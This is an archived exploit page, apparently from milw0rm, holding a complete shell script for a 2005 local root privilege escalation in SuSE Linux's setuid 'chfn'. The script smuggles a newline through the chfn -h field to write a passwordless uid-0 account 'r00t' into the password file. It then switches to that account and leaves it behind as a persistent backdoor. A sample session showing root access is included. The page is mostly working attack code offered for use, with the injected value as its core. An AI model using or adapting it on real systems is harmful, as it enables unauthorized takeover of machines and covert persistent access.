<html><head><title>SuSE Linux <= 9.3, 10 (chfn) Local Root Privilege Escalation Exploit</title></head><pre>#!/bin/sh
#
# Exploit for SuSE Linux 9.{1,2,3}/10.0, Desktop 1.0, UnitedLinux 1.0
# and SuSE Linux Enterprise Server {8,9} 'chfn' local root bug.
# 
# by Hunger &lt;susechfn@hunger.hu&gt;
#
# Advistory:
# http://lists.suse.com/archive/suse-security-announce/2005-Nov/0002.html
# 
# hunger@suse:~&gt; id
# uid=1000(hunger) gid=1000(hunger) groups=1000(hunger)
# hunger@suse:~&gt; ./susechfn.sh
# Type your current password to get root... :)
# Password:
# sh-2.05b# id
# uid=0(r00t) gid=0(root) groups=0(root)

if [ X&quot;$SHELL&quot; = &quot;X&quot; ]; then
	echo &quot;No SHELL environment, using /bin/sh for default.&quot;
	export SHELL=/bin/sh
fi

if [ -u /usr/bin/chfn ]; then
	/bin/echo &quot;Type your current password to get root... :)&quot;
	/usr/bin/chfn -h &quot;`echo -e ':/:'$SHELL'\nr00t::0:0:'`&quot; $USER &gt; /dev/null
	if [ -u /bin/su ]; then
		/bin/su r00t
		/bin/echo &quot;You can get root again with 'su r00t'&quot;
	else 
		echo &quot;/bin/su file is not setuid root :(&quot;
	fi
else
echo &quot;/usr/bin/chfn file is not setuid root :(&quot;
fi

# milw0rm.com [2005-11-08]</pre></html>